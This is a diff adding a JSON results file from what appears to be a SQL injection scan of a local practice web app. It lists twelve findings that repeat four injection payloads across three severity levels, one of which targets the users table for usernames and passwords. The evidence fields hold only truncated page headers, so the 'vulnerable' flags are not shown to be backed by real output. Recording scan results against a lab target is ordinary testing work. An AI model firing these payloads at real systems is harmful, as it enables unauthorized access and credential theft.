@@ -1,0 +1,112 @@
+{
+    "findings": [
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Low",
+            "payload": "' OR '1'='1",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Low",
+            "payload": "' OR '1'='1' --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Low",
+            "payload": "' UNION SELECT NULL,NULL --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Low",
+            "payload": "' UNION SELECT username,password FROM users --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Medium",
+            "payload": "' OR '1'='1",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Medium",
+            "payload": "' OR '1'='1' --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Medium",
+            "payload": "' UNION SELECT NULL,NULL --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "Medium",
+            "payload": "' UNION SELECT username,password FROM users --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "High",
+            "payload": "' OR '1'='1",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "High",
+            "payload": "' OR '1'='1' --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "High",
+            "payload": "' UNION SELECT NULL,NULL --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        },
+        {
+            "test": "SQL Injection",
+            "url": "http://localhost:8080/vulnerabilities/sqli/",
+            "severity": "High",
+            "payload": "' UNION SELECT username,password FROM users --",
+            "vulnerable": true,
+            "status_code": 200,
+            "evidence": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=\"Content"
+        }
+    ]
+}
